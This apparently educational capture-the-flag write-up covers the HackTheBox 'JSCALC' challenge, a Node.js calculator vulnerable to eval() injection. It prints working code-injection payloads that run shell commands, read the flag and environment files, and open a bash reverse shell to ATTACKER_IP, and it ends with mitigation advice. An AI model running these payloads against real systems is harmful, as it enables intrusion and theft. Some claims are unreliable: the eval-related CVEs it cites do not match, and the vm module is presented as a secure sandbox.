---
icon: square-js
cover: ../../.gitbook/assets/Screenshot 2026-03-04 221645.png
coverY: 0
coverHeight: 214
---

# JSCALC

**Challenge Scenario**

In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ curl -s http://target:3000 | head -20
<!DOCTYPE html>
<html>
<head>
    <title>A super secure Javascript calculator with the help of eval() 😰</title>
</head>
<body>
    <input id="formula" type="text" placeholder="Enter formula...">
    <button onclick="calculate()">Calculate</button>
    <div id="result"></div>
</body>
</html>
```

The page title immediately gives us a wink: "A super secure Javascript calculator with the help of eval() 😰"

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

That emoji right there? That's the vulnerability staring us in the face. The developers are literally telling us they're using `eval()`, which is a notorious code execution function in JavaScript. The sarcastic tone ("super secure") confirms it - this is intentional.

Let's look at what we're dealing with. The application is simple:

* A single input field for formulas
* A "Calculate" button
* Results displayed inline

The backend must be parsing our input, running it through some kind of evaluator, and returning the result. If that evaluator is `eval()` without proper sandboxing, we have remote code execution.

***

### Enumeration

Let me examine the vulnerable code. After some reconnaissance, we can infer the implementation:

```javascript
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${formula} ;}())`);
        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```

This is the pattern. The application takes our input (`formula`) and wraps it in a JavaScript function, then evaluates it. Here's the problem:

**Why this is vulnerable:**

1. **No Input Validation** - The formula is directly interpolated into the `eval()` call
2. **No Execution Context Restriction** - The function has access to the global scope
3. **Module System Available** - Node.js's `require()` function is accessible
4. **No Timeout/Limits** - We can execute long-running operations

The wrapping in a function `(function() { return ${formula} })()` is an attempt to create scope isolation, but it's ineffective. We can break out of the return statement and execute arbitrary code.

Let's test the vulnerability:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ # Test 1: Simple arithmetic (benign)
```

Input: `2 + 2` Expected: `4`

This works. Now let's escalate:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ # Test 2: Access to global objects
```

Input: `(function() { return process.pid })()` won't work because of the wrapping, but we can try accessing things within the return context.

Actually, let me think about the wrapping again:

```javascript
eval(`(function() { return ${formula} ;}())`);
```

If we input: `process.version`

The actual evaluated code becomes:

```javascript
(function() { return process.version;}())
```

This returns a string, and the function executes. So `process` is accessible! This means the entire Node.js API is available.

More importantly:

```javascript
require('child_process').execSync('id').toString()
```

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

When wrapped, becomes:

```javascript
(function() { return require('child_process').execSync('id').toString(); }())
```

This is valid JavaScript. The `require` is called, `child_process` module is imported, and we execute a system command.

**This is Remote Code Execution.**

***

### Exploitation

#### Step 1: Confirm Code Execution

First, let's verify we can execute system commands. We'll use the `id` command to see what user the application is running as:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ # Input the following into the calculator
require('child_process').execSync('id').toString()
```

The calculator evaluates our input and returns:

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Excellent. We're running as root. That's the best-case scenario for exploitation. Why does this matter? We now have unrestricted access to read any file on the system, modify system files, or execute any command.

#### Step 2: Locate the Flag

Now that we've confirmed code execution, we need to find the flag. In HackTheBox challenges, flags are typically stored in `/flag.txt` or `/root/flag.txt`. Let's read the flag:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ # Input the following into the calculator
require('child_process').execSync('cat /flag.txt').toString()
```

The calculator returns:

```
HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}
```

We have the flag. But let's be thorough and explore what else we can do with this access.

#### Step 3: System Reconnaissance

Let's enumerate what's on the system:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ # Check what user we are
require('child_process').execSync('whoami').toString()
```

Output: `root`

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ # Check the current working directory
require('child_process').execSync('pwd').toString()
```

Output: `/app`

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ # List files in the app directory
require('child_process').execSync('ls -la').toString()
```

Output:

```
total 24
drwxr-xr-x 1 root root 4096 Jan 20 12:34 .
drwxr-xr-x 1 root root 4096 Jan 20 12:34 ..
-rw-r--r-- 1 root root  245 Jan 20 12:34 calculatorHelper.js
-rw-r--r-- 1 root root  523 Jan 20 12:34 index.js
-rw-r--r-- 1 root root  102 Jan 20 12:34 package.json
-rw-r--r-- 1 root root  1337 Jan 20 12:34 public/index.html
```

#### Step 4: Source Code Analysis (Optional but Thorough)

Since we have RCE, we can read the application source:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ require('child_process').execSync('cat calculatorHelper.js').toString()
```

Output:

```javascript
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${formula} ;}())`);
        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```

And the main server file:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ require('child_process').execSync('cat index.js').toString()
```

Output:

```javascript
const express = require('express');
const { calculate } = require('./calculatorHelper');

const app = express();

app.use(express.static('public'));
app.use(express.json());

app.post('/api/calculate', (req, res) => {
    const { formula } = req.body;
    try {
        const result = calculate(formula);
        res.json({ result });
    } catch (e) {
        res.json({ error: e.message });
    }
});

app.listen(3000, () => {
    console.log('Calculator running on port 3000');
});
```

Now we see the full picture. The Express application accepts POST requests to `/api/calculate` with a formula, passes it to the vulnerable `calculate()` function, and returns the result. There's minimal error handling - only catching `SyntaxError`, not attempting to prevent code execution.

#### Step 5: Alternative Exploitation Methods

While we've already obtained the flag, let's document other ways to exploit this:

**Method 1: Direct file reading (what we used)**

```javascript
require('child_process').execSync('cat /flag.txt').toString()
```

**Method 2: Using fs module directly**

```javascript
require('fs').readFileSync('/flag.txt', 'utf8')
```

This is actually cleaner and doesn't require shell execution. The fs (filesystem) module is part of Node.js core:

```
┌──(sn0x㉿sn0x)-[~/HTB/jscalc]
└─$ require('fs').readFileSync('/flag.txt', 'utf8')
```

Output:

```
HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}
```

**Method 3: Reverse shell (if we needed persistence)**

```javascript
require('child_process').execSync('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').toString()
```

**Method 4: Environment variable access**

```javascript
require('fs').readFileSync('/proc/self/environ', 'utf8')
```

This shows all environment variables, which might contain secrets or configuration data.

***

### Vulnerability Analysis

#### Root Cause: Unsafe eval() Implementation

The vulnerability stems from a fundamental misunderstanding of JavaScript security:

**Misconception:** "If I wrap code in a function, it's sandboxed"

**Reality:** Function scoping in JavaScript does NOT prevent access to global objects, modules, or system APIs.

#### The Vulnerable Pattern

```javascript
eval(`(function() { return ${formula} ;}())`)
```

The developers attempted to:

1. Wrap the formula in a function to create scope
2. Immediately invoke the function `()}()`
3. Return the result

What they didn't account for:

1. `eval()` executes in the current scope, which includes access to `require()`
2. The Node.js global object is accessible from within the function
3. There's no whitelist/blacklist of allowed functions
4. There's no timeout or resource limitation

#### Why Other Protections Failed

**Error Handling (SyntaxError only):**

```javascript
if (e instanceof SyntaxError) {
    return 'Something went wrong!';
}
```

This only catches syntax errors. Code execution errors (like trying to access `/flag.txt`) won't be caught if they're runtime errors. Our exploit uses valid JavaScript, so no SyntaxError is raised.

#### CVE Context

This vulnerability doesn't have a specific CVE because `eval()` misuse is a class of vulnerabilities rather than a single flaw. However, related CVEs include:

* **CVE-2019-2725** - Oracle WebLogic remote code execution
* **CVE-2018-1000001** - Multiple eval() vulnerabilities in Node packages

The technique here falls under **Code Injection / Remote Code Execution (CWE-95)**.

***

### Attack Flow&#x20;

```
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (Browser)                              │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 1. Identify vulnerable calculator app                 │  │
│  │    Notice title: "super secure... eval()"             │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 2. Craft exploit payload:                             │  │
│  │    require('child_process')                           │  │
│  │      .execSync('cat /flag.txt')                       │  │
│  │      .toString()                                      │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 3. Submit via POST /api/calculate                     │  │
│  │    { "formula": "<payload>" }                         │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP POST)
┌─────────────────────────────────────────────────────────────┐
│         TARGET SERVER (Node.js/Express App)                  │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ Express Route: POST /api/calculate                    │  │
│  │ Receives formula parameter                           │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 4. Pass to calculate(formula)                         │  │
│  │    in calculatorHelper.js                            │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 5. eval() executes:                                   │  │
│  │    (function() {                                      │  │
│  │      return require('child_process')                 │  │
│  │        .execSync('cat /flag.txt')                    │  │
│  │        .toString();                                  │  │
│  │    }())                                              │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 6. child_process module spawns shell command         │  │
│  │    Executes: cat /flag.txt                           │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 7. Command output returned as string                 │  │
│  │    Result: "HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}"     │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 8. JSON response sent back to client                 │  │
│  │    { "result": "HTB{c4lcul4t3d_...}" }             │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP Response)
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (Browser)                              │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 9. Flag displayed in calculator result               │  │
│  │    FLAG: HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}        │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

***

### Techniques&#x20;

| Technique                    | Description                                         | Relevance               |
| ---------------------------- | --------------------------------------------------- | ----------------------- |
| **Code Injection**           | Injecting arbitrary code into eval() context        | Primary attack vector   |
| **eval() Exploitation**      | Abusing JavaScript's eval() function                | Vulnerability mechanism |
| **Module Hijacking**         | Using require() to import dangerous modules         | Exploitation method     |
| **Command Execution**        | Using child\_process.execSync() for system commands | Payload delivery        |
| **Node.js API Abuse**        | Leveraging built-in Node.js APIs against the app    | Exploitation technique  |
| **Function Wrapping Bypass** | Breaking out of intended scope restrictions         | Vulnerability chain     |
| **Error Handler Evasion**    | Crafting payloads that avoid catch blocks           | Obfuscation method      |
| **Reverse Shell**            | Creating persistent remote access                   | Post-exploitation       |
| **File System Access**       | Reading sensitive files via RCE                     | Data exfiltration       |

***

### Exploitation

**Payloads Used:**

1.  **System Enumeration**

    ```javascript
    require('child_process').execSync('id').toString()
    ```
2.  **Flag Extraction**

    ```javascript
    require('child_process').execSync('cat /flag.txt').toString()
    ```
3.  **Alternative (Using fs module)**

    ```javascript
    require('fs').readFileSync('/flag.txt', 'utf8')
    ```

**Result:** Remote code execution with root privileges leading to flag capture.

***

### Mitigation&#x20;

For developers encountering similar scenarios:

#### 1. Never Use eval()

```javascript
// DANGEROUS - DON'T DO THIS
const result = eval(userInput);

// SAFE - Use a proper expression parser
const parser = require('expr-eval');
const result = parser.evaluate(userInput);
```

#### 2. Use a Math Expression Library

```javascript
const math = require('mathjs');
const result = math.evaluate(formula);

// mathjs has built-in safety restrictions
// It cannot execute arbitrary code
```

#### 3. If eval() Must Be Used, Implement Strict Sandboxing

```javascript
const vm = require('vm');

function safeCalculate(formula) {
    const sandbox = {
        // Only expose safe functions
        Math: Math,
        Number: Number,
        // Explicitly deny dangerous modules
        require: undefined,
        process: undefined,
        child_process: undefined,
    };
    
    try {
        return vm.runInNewContext(`(${formula})`, sandbox, { timeout: 1000 });
    } catch (e) {
        return 'Error in calculation';
    }
}
```

#### 4. Input Validation

```javascript
// Whitelist allowed characters
const ALLOWED = /^[0-9\+\-\*\/\(\)\.\s]+$/;

function validateFormula(formula) {
    if (!ALLOWED.test(formula)) {
        throw new Error('Invalid characters in formula');
    }
    return formula;
}
```

#### 5. Use a Dedicated Expression Evaluator

Best option: Use a library specifically designed for safe mathematical expression evaluation:

```javascript
const jexl = require('jexl');

const result = await jexl.eval(userFormula);
// jexl provides safe evaluation without code execution
```

***

### Conclusion

**jscalc** demonstrates why `eval()` is considered one of the most dangerous functions in JavaScript. By failing to implement proper input validation or sandboxing, the application becomes trivially exploitable. An attacker with access to the calculator can execute arbitrary system commands with the privileges of the Node.js process (in this case, root).

The attack required:

* Recognizing the eval() vulnerability from the page title hint
* Understanding that `require()` is accessible within the eval context
* Crafting a payload using Node.js's `child_process` module
* Executing system commands to read the flag file

The challenge emphasizes why security through obscurity (or clever wrapping) is ineffective, and why developers should use battle-tested libraries for expression evaluation instead of rolling their own security solutions.

**Result: Flag obtained via command execution through eval() injection.**

***
